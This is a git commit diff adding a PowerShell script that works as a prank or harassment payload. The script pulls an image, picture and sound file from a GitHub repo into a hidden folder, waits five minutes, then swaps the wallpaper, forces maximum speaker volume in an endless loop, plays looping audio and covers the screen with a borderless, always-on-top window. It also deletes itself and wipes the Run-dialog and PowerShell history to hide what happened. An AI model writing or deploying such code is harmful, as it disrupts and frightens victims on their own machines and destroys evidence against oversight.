d3cd09238619204c752b459e210d1eb3bfbeea19
Noshbit <93923548+Noshbit@users.noreply.github.com>
2022-12-04 12:19:00 +0100

    Update 1.ps1

--- 1.ps1
+++ 1.ps1
@@ -1,2 +1,55 @@
+iwr "https://raw.githubusercontent.com/Noshbit/black/main/w.jpg" -outfile "$env:USERPROFILE\temp\w.jpg"
+iwr "https://raw.githubusercontent.com/Noshbit/black/main/f.png" -outfile "$env:USERPROFILE\temp\f.png"
+iwr "https://raw.githubusercontent.com/Noshbit/black/main/s.wav" -outfile "$env:USERPROFILE\temp\s.wav"
 attrib +s +h "$env:USERPROFILE\temp";
-While ($true) {iwr "https://media.nu.nl/m/kcgx47lam66h_wd1280.jpg/sylvana-simons-verklaart-vertrek-bij-debat-leef-al-jaren-met-chronische-pijn.jpg" -outfile "$env:USERPROFILE\temp\a.jpg"; sp 'HKCU:Control Panel\Desktop' Wallpaper "$env:USERPROFILE\temp\a.jpg"; 1..59 | % {RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters -windowstyle hidden; $i; $i++}; sleep 30}
+
+Function Set-SpeakerVolume
+{ Param (
+  [switch]$min,
+  [switch]$max)
+  $wshShell = new-object -com wscript.shell
+  If ($min)
+  {1..50 | % {$wshShell.SendKeys([char]174)}}
+  ElseIf ($max)
+  {1..50 | % {$wshShell.SendKeys([char]175)}}
+  Else
+  {$wshShell.SendKeys([char]173)} }
+  
+
+sleep 300;
+
+sp 'HKCU:Control Panel\Desktop' Wallpaper "$env:USERPROFILE\temp\w.jpg"; 1..59 | % {RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters -windowstyle hidden;};
+
+Set-SpeakerVolume -Max
+
+$player = New-Object System.Media.SoundPlayer "$env:USERPROFILE\temp\s.wav"
+$player.PlayLooping();
+
+Add-Type -AssemblyName system.windows.Forms
+$user = $env:USERNAME
+$computer = $env:COMPUTERNAME
+$Form = New-Object system.windows.forms.form
+$form.TopMost = $true
+$Image = [system.drawing.image]::FromFile("$env:USERPROFILE\temp\f.png")
+$Form.BackgroundImage = $Image
+$Form.BackgroundImageLayout = "Zoom"
+$Form.ShowInTaskbar = $false;
+$Form.BackColor = "#000000"
+$Form.WindowState = 'Maximized'
+$Form.MinimizeBox = $False
+$Form.ControlBox = $False
+$Form.ShowInTaskbar = $False
+$Form.FormBorderStyle = 'None'
+$Form.MaximizeBox = $False
+
+$Form.Show();
+
+rm "$env:userprofile\temp\1.ps1";
+
+Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue;
+
+$pshist = Get-PSReadlineOption | select -expand historysavepath; rm $pshist;
+
+WHILE ($TRUE) {
+	Set-SpeakerVolume -Max
+}
